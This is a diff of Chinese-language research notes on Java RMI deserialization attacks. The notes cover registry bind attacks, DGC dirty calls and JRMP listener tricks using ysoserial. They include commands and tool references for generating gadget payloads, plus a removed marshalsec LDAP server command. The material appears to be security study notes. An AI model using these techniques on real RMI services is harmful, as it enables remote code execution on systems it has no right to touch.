@@ -47,19 +47,66 @@ at Client.main(Client.java:16)
 Server/Registry实际上是一对特殊的C/S, Server也是先拿到Registry的Stub，然后执行registry.bind(name, obj), 然后转registry执行，ObjID对应的对象就是registryImpl，执行的bind方法，往bindings写入 (name, stub)
 
 ## RMI攻击手法
+
+### 参数、结果反序列化
+
+
+
 https://forum.butian.net/share/541
 
 调用远程方法并得到结果, 涉及到两次反序列化, 分别是
 
-1. 服务器反序列化参数
-2. 客户端反序列化结果
+1. 服务器反序列化参数 `ServerAttacker.RMIClient`
+2. 客户端反序列化结果`services.ServiceImpl#process`
+
+这两个很容易就可以实现，自己写的Remote接口高版本JDK可用。
 
 
 
-## 其他
+registry相对于server（执行bind的一方），也是服务器, 反序列化bind(String name, Remote obj)
 
-### 启动ldap服务：
+1. `ysoserial.exploit.RMIRegistryExploit` 就是把payload代理成Remote类，然后bind
 
-`java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8888/#Exploit 9999`
-Exploit类在8888端口的web服务目录下。
-lookup`ldap://localhost:1389`触发
+2. 或者`RMI/RegistryAttacker/RMIClient.java:163`模拟bind函数的通信过程，registry反序列化name的时候就可以触发了。（服务端实现是`String name = (String) ois.readObject()` ）
+
+```
+bindLowLevel(regHost, regPort, cc6, cc6)
+```
+
+高版本JDK由于存在JEP290（？）过滤了dirty/clean/bind/lookup 入参（在反序列化的时候会检查），不可用
+
+### DGC 机制
+
+1. 正向dirty
+
+   同样由于JEP290，JDK高版本（JDK8u202）不可用。
+
+   registry和server都执行过exportObj，会存在DGC服务，Client可以dirty（续约），并且参数可以是gadget。目标会反序列化这个gadget实现RCE。实现: `ysoserial.exploit.JRMPClient` 
+
+```txt 
+（gadget触发）
+at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
+at sun.rmi.transport.DGCImpl_Skel.dispatch(Unknown Source:-1)
+at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:410)
+at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
+```
+
+registry的DGC服务器和registry本身一般是同一个端口，Server也一样。找到对应端口直接Dirty即可。`ServerAttacker.ByDCGDirty`
+
+2. 反向
+
+   JDK高版本（JDK8u202）可用
+
+   实现DGC服务，让受害者来续约，并返回一个Exception，受害者会反序列化这个结果。
+
+   DGC 服务实现：`ysoserial.exploit.JRMPListener`
+
+   然后就是想办法投递给目标投递一个UnicastRef对象，指向我们的JRMPListener的端口，目标就会主动来续约。
+
+   可以通过bind，打registry。`RegistryAttacker/RMIClient.java:175（dcg模式）`
+
+   可以通过lookup返回UnicastRef对象，打Client。`ClientAttacker.GuideClient2JRMP`
+
+   如何打Server? 通过前面的参数反序列化（unmarshall）出一个UnicastRef对象。
+
+   可以通过反序列化投递（直接`java -jar ./target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 127.0.0.1:7470 > payload.bin`）
